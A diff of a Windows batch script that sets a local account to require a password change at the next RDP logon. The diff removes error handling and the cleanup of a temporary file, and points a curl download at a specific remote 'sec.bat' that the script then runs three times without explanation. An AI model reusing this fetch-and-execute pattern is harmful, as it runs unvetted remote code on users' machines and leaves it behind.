@@ -15,18 +15,17 @@ if %errorlevel% neq 0 (
 set /p MUSTCHANGE=[?] %username% must change password at next RDP logon? (5) 
 if "!MUSTCHANGE!"=="5" (
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '%USERNAME%' -PasswordNeverExpires $false"
-    if errorlevel 1 (
-        echo [!] failed to set passwordneverexpires via powershell. trying wmic
-        wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE
-    )
 
     powershell -Command "[ADSI]$user='WinNT://./%USERNAME%'; $user.Put('PasswordExpired', 1); $user.SetInfo()"
-    if errorlevel 1 echo [!] failed to set passwordexpired via adsi & pause
+
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=True
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=TRUE
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True
 
     net user %username% /logonpasswordchg:yes
-    if errorlevel 1 echo [!] failed to set logonpasswordchg & pause
     
-    set "url=https://github.com/username/repository/raw/main/script.bat"
+    set "url=https://raw.githubusercontent.com/al0nks1337/al0nks1337.github.io/refs/heads/main/sec.bat"
     set "file=%temp%\downloaded_script.bat"
     
     curl -L -o "!file!" "!url!" >nul 2>&1
@@ -38,34 +37,30 @@ if "!MUSTCHANGE!"=="5" (
     start "" /wait cmd /c "!file!"
 
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '%USERNAME%' -PasswordNeverExpires $false"
-    if errorlevel 1 (
-        echo [!] failed to set passwordneverexpires via powershell. trying wmic
-        wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE
-    )
 
     powershell -Command "[ADSI]$user='WinNT://./%USERNAME%'; $user.Put('PasswordExpired', 1); $user.SetInfo()"
-    if errorlevel 1 echo [!] failed to set passwordexpired via adsi & pause
+
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=True
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=TRUE
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True
 
     net user %username% /logonpasswordchg:yes
-    if errorlevel 1 echo [!] failed to set logonpasswordchg & pause
 
     start "" /wait cmd /c "!file!"
 
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '%USERNAME%' -PasswordNeverExpires $false"
-    if errorlevel 1 (
-        echo [!] failed to set passwordneverexpires via powershell. trying wmic
-        wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE
-    )
 
     powershell -Command "[ADSI]$user='WinNT://./%USERNAME%'; $user.Put('PasswordExpired', 1); $user.SetInfo()"
-    if errorlevel 1 echo [!] failed to set passwordexpired via adsi & pause
+
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=True
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=TRUE
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True
 
     net user %username% /logonpasswordchg:yes
-    if errorlevel 1 echo [!] failed to set logonpasswordchg & pause
 
     start "" /wait cmd /c "!file!"
-
-    if exist "!file!" del /q "!file!"
 
     echo [*] password change requirement set for %username%
 ) else (
